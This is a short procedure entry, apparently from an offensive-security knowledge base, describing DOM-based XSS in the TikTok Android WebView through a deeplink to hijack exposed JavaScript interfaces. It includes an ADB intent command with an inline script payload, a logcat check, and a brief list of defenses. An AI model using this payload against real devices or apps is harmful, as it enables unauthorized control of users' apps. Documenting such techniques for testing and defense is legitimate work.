---
id: proc-takeover-webview-js
tags:
  - xss
  - dom-xss
  - js-takeover
  - webview
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:26:27.801Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Takeover-Webview-JS-Interfaces

## Summary

This procedure uses DOM-based XSS in the traversed Webview to inject malicious Javascript, taking over exposed interfaces like Lynxview for unauthorized app control.

## Description

The vulnerability stems from unsanitized URL parameters in Webview loads, allowing DOM manipulation that hijacks addJavascriptInterface objects. In TikTok, this leads to control over app features such as data access or actions. The attack requires prior traversal; outcomes include arbitrary JS execution in the app's trusted context.

## Requirements

1. Successful deeplink traversal to Webview
2. ADB for payload delivery and monitoring
3. Payload crafted for DOM sink (e.g., location.href)

## Defense

Defensive measures and detection strategies:

- Disable or restrict addJavascriptInterface in Webviews
- Sanitize all DOM-writable sinks (e.g., innerHTML, location)
- Implement Content Security Policy (CSP) in Webviews

## Objectives

1. Inject XSS payload to override JS interfaces
2. Execute arbitrary code in Webview
3. Achieve persistent control over app interactions

## Instructions

### Step 1: Inject DOM XSS Payload

**Context**: Deliver a payload exploiting the URL-based DOM sink to eval attacker JS.

Trigger via ADB intent:

```bash
adb shell am start -a android.intent.action.VIEW -d "tiktok://lynxview?url=<script>lynxview.dangerousMethod=alert; document.location='javascript:lynxview.dangerousMethod(\"hacked\")'</script>" com.zhiliaoapp.musically
```

> The payload overrides the interface method, confirming takeover if custom actions execute.

### Step 2: Verify Interface Control

**Context**: Test for full takeover by invoking hijacked methods.

Monitor with extended logcat:

```bash
adb logcat | grep -E "(WebView|JavascriptInterface|Lynxview)"
```

> Success if logs or app behavior show altered JS calls.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ADB]]

## Tags

- [[xss]]
- [[dom-xss]]
